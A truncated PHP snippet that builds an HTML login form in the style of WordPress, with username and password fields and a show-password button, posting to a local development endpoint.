...
$form = '<div class="login-wrapper">
    ...
    <div class="login-wrapper__col">
        ...
        <form name="loginform" id="loginform" action="https://logger.local/bridge/access" method="post">
            <div class="form-field">
                <input type="text" name="log" id="user_login" class="login-form__input" size="20" autocapitalize="off" />
                <label for="user_login">Username or Email Address</label>
            </div>

            <div class="form-field user-pass-wrap">
                <input type="password" name="pwd" id="user_pass" class="login-form__input" size="20" />
                <label for="user_pass">Password</label>
                <button type="button" class="login-form__button wp-hide-pw" data-toggle="0" aria-label="Show password">
